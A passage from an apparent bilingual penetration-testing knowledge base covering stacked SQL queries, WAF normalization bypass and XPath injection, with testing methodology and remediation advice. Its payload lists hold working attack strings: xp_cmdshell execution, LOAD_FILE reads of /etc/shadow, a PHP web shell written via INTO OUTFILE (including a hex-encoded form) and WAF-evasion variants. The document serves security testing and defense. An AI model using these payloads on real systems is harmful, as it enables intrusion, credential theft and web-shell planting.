opsecTips.zh: 短延时第二语句得到一次可重复证明后停止；不得在同一运行中继续到 xp_cmdshell、LOAD_FILE 或 OUTFILE。
opsecTips.en: Stop after one repeatable proof of the short-delay second statement; do not continue to xp_cmdshell, LOAD_FILE, or OUTFILE in the same run.

opsecTips.zh: 终止等待会话，删除临时表和标记文件，撤销文件权限并恢复 xp_cmdshell 等功能开关及连接池状态。
opsecTips.en: Terminate waiting sessions, delete temporary tables and marker files, revoke filesystem grants, and restore feature switches such as xp_cmdshell and connection-pool state.

name.zh: 堆叠查询与数据库高影响链（待拆分）
name.en: Stacked Queries and High-Impact Database Chains (Split Required)

description.zh: 混合时间证明、SQL Server 命令执行、数据库文件读取与 MySQL 文件写入，需按影响和权限拆分。
description.en: Combines timing proof, SQL Server command execution, database file reads, and MySQL file writes and must be split by impact and privileges.

overview.zh: 堆叠查询与数据库高影响链（待拆分）聚焦分号后的短延时只能证明第二语句执行；xp_cmdshell、LOAD_FILE 和 OUTFILE 各自需要产品、开关、角色和文件 ACL。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: Stacked Queries and High-Impact Database Chains (Split Required) focuses on this boundary: A short delay after a semicolon proves second-statement execution, while xp_cmdshell, LOAD_FILE, and OUTFILE each require product, feature, role, and filesystem prerequisites. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 输入可结束原语句并追加 SQL 时，影响由驱动和数据库账户决定；高权限功能会把注入升级为命令、文件读取或代码落地。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: When input can terminate and append SQL, impact depends on driver and database-account capabilities; privileged features escalate injection to commands, file reads, or code placement. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 先只用短延时或固定常量 SELECT 证明堆叠，再读取配置与权限元数据；高影响命令分别路由到对应目标卡。 数据库审计必须显示同一请求执行第二语句；whoami、系统文件或 WebShell 失败只说明权限不足，不能否定堆叠注入。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: First prove stacking with a short delay or fixed constant SELECT, then inspect configuration and privilege metadata; route high-impact commands to focused target cards. Database auditing must show the same request executing a second statement; failure of whoami, system files, or a web shell indicates privilege limits, not absence of stacking. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 参数化查询、关闭不需要的多语句，禁用 xp_cmdshell，撤销 FILE 权限，并禁止数据库服务账户写入 Web 根。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Parameterize queries, disable unnecessary multi-statements and xp_cmdshell, revoke FILE privilege, and deny web-root writes to the database service account. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认堆叠查询影响拆分前置条件
title.en: Confirm Stacked-Query Impact Split prerequisites

description.zh: 分号后的短延时只能证明第二语句执行；xp_cmdshell、LOAD_FILE 和 OUTFILE 各自需要产品、开关、角色和文件 ACL。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: A short delay after a semicolon proves second-statement execution, while xp_cmdshell, LOAD_FILE, and OUTFILE each require product, feature, role, and filesystem prerequisites. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控堆叠查询影响拆分探针
title.en: Run a controlled Stacked-Query Impact Split probe

description.zh: 先只用短延时或固定常量 SELECT 证明堆叠，再读取配置与权限元数据；高影响命令分别路由到对应目标卡。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: First prove stacking with a short delay or fixed constant SELECT, then inspect configuration and privilege metadata; route high-impact commands to focused target cards. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
;SELECT SLEEP(5);--
';SELECT SLEEP(5);--
";SELECT SLEEP(5);--
' OR IF(1=1, SLEEP(5), 0)--
EXEC xp_cmdshell 'whoami';--
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';--
SELECT LOAD_FILE('/etc/passwd');--
SELECT LOAD_FILE('/etc/shadow');--
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');--
' UNION SELECT '<?php system(["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO DUMPFILE '/var/www/html/shell.php'--

title.zh: 核对堆叠查询影响拆分成功证据
title.en: Verify Stacked-Query Impact Split evidence

description.zh: 数据库审计必须显示同一请求执行第二语句；whoami、系统文件或 WebShell 失败只说明权限不足，不能否定堆叠注入。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Database auditing must show the same request executing a second statement; failure of whoami, system files, or a web shell indicates privilege limits, not absence of stacking. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归堆叠查询影响拆分
title.en: Remediate and regress Stacked-Query Impact Split

description.zh: 参数化查询、关闭不需要的多语句，禁用 xp_cmdshell，撤销 FILE 权限，并禁止数据库服务账户写入 Web 根。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Parameterize queries, disable unnecessary multi-statements and xp_cmdshell, revoke FILE privilege, and deny web-root writes to the database service account. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 同一命令块跨越只读证明、命令执行、文件读取和写入，必须按影响和 DBMS 拆分。

prerequisites.zh: 在 WAF、反向代理、应用框架和数据库边界记录原始字节、解码次数、字符集和最终 SQL 令牌。
prerequisites.en: Record raw bytes, decode count, character set, and final SQL tokens at the WAF, reverse proxy, application framework, and database boundaries.

prerequisites.zh: 确认 MySQL 版本注释及目标方言的注释规则，为规范形式、单一变换形式和结构相同的恒假谓词建立配对。
prerequisites.en: Confirm MySQL version-comment behavior and the target dialect's comment rules, pairing canonical, single-transformation, and structurally matched false predicates.

analysis.zh: 阳性是规范形式被同一策略阻止，而某个最小编码、大小写或注释拆分变体被放行，随后由应用/数据库规范化为可执行谓词并产生受控标记差异。WAF 未告警、HTTP 200、日志显示 SELECT、数据库报语法错、双重解码只改变显示或页面复述字符串均是假阳性。
analysis.en: Positive evidence is the canonical form being blocked by the same policy while one minimal encoding, case, or comment-splitting variant passes, is normalized into an executable predicate by the application or database, and produces a controlled marker differential. No WAF alert, HTTP 200, SELECT appearing in logs, a database syntax error, double decoding that changes only display, or page reflection is a false positive.

opsecTips.zh: 确认一个最小变换及其发生分歧的层后停止，不继续组合大小写、注释和多重百分号编码。
opsecTips.en: Stop after confirming one minimal transformation and the layer where behavior diverges; do not combine case, comments, and repeated percent encoding.

opsecTips.zh: 移除原始流量调试记录，清空代理和应用解码缓存，删除临时 WAF 例外，并恢复统一规范化规则。
opsecTips.en: Remove raw-traffic debug records, clear proxy and application decoding caches, delete temporary WAF exceptions, and restore consistent normalization rules.

name.zh: SQL 注入规范化绕过模式

description.zh: 使用版本注释、关键词拆分、百分号编码和大小写变体，验证 WAF、应用与数据库解码及词法分析是否一致。
description.en: Uses version comments, keyword splitting, percent encoding, and case variants to test decoding and lexical consistency across WAF, application, and database.

overview.zh: SQL 注入规范化绕过模式聚焦MySQL 版本注释可执行内容，内联注释可拆词，百分号编码可在不同层解码；必须捕获原始字节和最终 SQL。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: SQL Injection Normalization-Bypass Patterns focuses on this boundary: MySQL version comments may execute content, inline comments can split tokens, and percent encoding can decode at different layers; capture raw bytes and final SQL. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: WAF 一次解码或简单正则后判断，而应用再次解码或数据库赋予注释特殊语义，攻击文本可能在检测后恢复为有效 SQL。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: When a WAF inspects after one decode or simple regex while the application decodes again or the database gives comments special meaning, text can become valid SQL after inspection. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 先以普通 UNION 或真假谓词确认注入，再一次只改变注释、编码或大小写，保持 SQL 语义和其他字节不变。 只有普通形式被拦截、变体到达后端且最终表达式执行，才说明规范化绕过；单纯状态码变化不成立。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Confirm injection with a plain UNION or predicate, then change only comment, encoding, or case while preserving SQL semantics and all other bytes. A normalization bypass requires the plain form to be blocked, the variant to reach the backend, and the final expression to execute; status-code changes alone are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 在可信边界只做一次严格规范化，拒绝双重编码和非法 UTF-8，再类型校验与参数绑定；WAF 仅作纵深。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Canonicalize once at the trust boundary, reject double encoding and invalid UTF-8, then validate types and bind parameters; use the WAF only as defense in depth. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认SQL/WAF 规范化差异前置条件
title.en: Confirm SQL/WAF Normalization Differences prerequisites

description.zh: MySQL 版本注释可执行内容，内联注释可拆词，百分号编码可在不同层解码；必须捕获原始字节和最终 SQL。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: MySQL version comments may execute content, inline comments can split tokens, and percent encoding can decode at different layers; capture raw bytes and final SQL. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控SQL/WAF 规范化差异探针
title.en: Run a controlled SQL/WAF Normalization Differences probe

description.zh: 先以普通 UNION 或真假谓词确认注入，再一次只改变注释、编码或大小写，保持 SQL 语义和其他字节不变。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Confirm injection with a plain UNION or predicate, then change only comment, encoding, or case while preserving SQL semantics and all other bytes. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
/*!50000SELECT*/1--
/*!UNION*//*!SELECT*/1,2,3--
%55NION %53ELECT 1,2,3--
uni/**/on sel/**/ect 1,2,3--
unio%6e selec%74 1,2,3--
1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 1=0 OR 1=1--
1'||(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))||'

title.zh: 核对SQL/WAF 规范化差异成功证据
title.en: Verify SQL/WAF Normalization Differences evidence

description.zh: 只有普通形式被拦截、变体到达后端且最终表达式执行，才说明规范化绕过；单纯状态码变化不成立。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: A normalization bypass requires the plain form to be blocked, the variant to reach the backend, and the final expression to execute; status-code changes alone are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归SQL/WAF 规范化差异
title.en: Remediate and regress SQL/WAF Normalization Differences

description.zh: 在可信边界只做一次严格规范化，拒绝双重编码和非法 UTF-8，再类型校验与参数绑定；WAF 仅作纵深。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Canonicalize once at the trust boundary, reject double encoding and invalid UTF-8, then validate types and bind parameters; use the WAF only as defense in depth. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 这是 SQL 词法和规范化层面的 Payload 集，不是 WAF 指纹工具或通用字典。

prerequisites.zh: 使用只含合成用户和随机 canary 节点的独立 XML 文档，并确认 XPath 版本、命名空间及输入拼接位置。
prerequisites.en: Use an isolated XML document containing only synthetic users and a random canary node, and confirm the XPath version, namespaces, and input concatenation position.

prerequisites.zh: 启用编译后 XPath 或查询结果审计，为名称、节点计数和 substring 条件分别准备结构一致的真/假对照。
prerequisites.en: Enable compiled-XPath or query-result auditing, and prepare structurally matched true and false controls for name, node-count, and substring conditions.

analysis.zh: 阳性要求恒真 XPath 条件稳定返回预置 canary 节点或计数，而恒假条件不返回，且编译查询显示输入越过字符串边界。XML 解析错误、命名空间不匹配、正常搜索命中、页面回显表达式、或猜中常见节点名都不是 XPath 注入证据。
analysis.en: Positive evidence requires the true XPath condition to reproducibly return the preset canary node or count while the false condition does not, with the compiled query showing input crossing the string boundary. XML parse errors, namespace mismatch, legitimate search matches, expression reflection, or guessing a common node name are not XPath-injection evidence.

opsecTips.zh: 首次通过真/假条件定位到 canary 节点后停止，不枚举生产 XML 的用户、密码或完整树结构。
opsecTips.en: Stop after the first true/false pair locates the canary node; do not enumerate users, passwords, or the full tree of production XML.

opsecTips.zh: 删除测试 XML 和 canary，清除编译查询与响应缓存，并恢复命名空间配置和参数化 XPath 构造。
opsecTips.en: Delete the test XML and canary, clear compiled-query and response caches, and restore namespace configuration and parameterized XPath construction.

name.zh: XPath 表达式注入

description.zh: 通过布尔谓词、节点计数、名称判断和 substring 条件，验证输入是否被拼接到 XPath 查询表达式。
description.en: Uses Boolean predicates, node counts, name tests, and substring conditions to verify whether input is concatenated into an XPath query expression.

overview.zh: XPath 表达式注入聚焦XPath 注入针对 XML 查询而非关系型 SQL；应记录 XPath 版本与命名空间，并使用成对真假节点条件。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: XPath Expression Injection focuses on this boundary: XPath injection targets XML queries rather than relational SQL; record XPath version and namespaces and use paired true and false node conditions. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 输入被插入 XPath 字面量或谓词后，可关闭原字符串并追加 or、节点选择或函数；许多 API 缺少统一参数绑定。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Input inserted into an XPath literal or predicate can close the string and append or, node selection, or functions; many APIs lack universal parameter binding. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 用受控账户建立匹配与不匹配基线，再以相同闭合方式发送真假谓词；盲测只对测试节点做 count 或单字符判断。 最终 XPath、返回节点集合和身份必须一致证明查询被改变；统一登录错误、表达式语法错或空节点都不是充分证据。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Use a controlled account for match and no-match baselines, then send true and false predicates with identical closure; blind tests should query only controlled nodes. Final XPath, returned node set, and identity must jointly prove query alteration; generic login errors, expression errors, or empty nodes are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 使用固定 XPath 与变量解析器，不拼接路径或谓词；若无变量 API，使用经过验证的 XPath 字面量编码器并限制 XML 权限。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Use fixed XPath with variable resolvers rather than concatenating paths or predicates; if variables are unavailable, use a vetted XPath literal encoder and restrict XML access. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认XPath 查询注入前置条件
title.en: Confirm XPath Query Injection prerequisites

description.zh: XPath 注入针对 XML 查询而非关系型 SQL；应记录 XPath 版本与命名空间，并使用成对真假节点条件。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: XPath injection targets XML queries rather than relational SQL; record XPath version and namespaces and use paired true and false node conditions. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控XPath 查询注入探针
title.en: Run a controlled XPath Query Injection probe

description.zh: 用受控账户建立匹配与不匹配基线，再以相同闭合方式发送真假谓词；盲测只对测试节点做 count 或单字符判断。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Use a controlled account for match and no-match baselines, then send true and false predicates with identical closure; blind tests should query only controlled nodes. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
' or 1=1 or ''='
' or name()='admin' or '
count(/child::node())
' and string-length(/root/child::*)>0 and '1'='1
' or substring(//user[position()=1]/child::node()[position()=1],1,1)='a

title.zh: 核对XPath 查询注入成功证据
title.en: Verify XPath Query Injection evidence

description.zh: 最终 XPath、返回节点集合和身份必须一致证明查询被改变；统一登录错误、表达式语法错或空节点都不是充分证据。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Final XPath, returned node set, and identity must jointly prove query alteration; generic login errors, expression errors, or empty nodes are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归XPath 查询注入
title.en: Remediate and regress XPath Query Injection

description.zh: 使用固定 XPath 与变量解析器，不拼接路径或谓词；若无变量 API，使用经过验证的 XPath 字面量编码器并限制 XML 权限。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Use fixed XPath with variable resolvers rather than concatenating paths or predicates; if variables are unavailable, use a vetted XPath literal encoder and restrict XML access. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: XPath 条件是查询表达式载荷，不是 XML 工具命令。
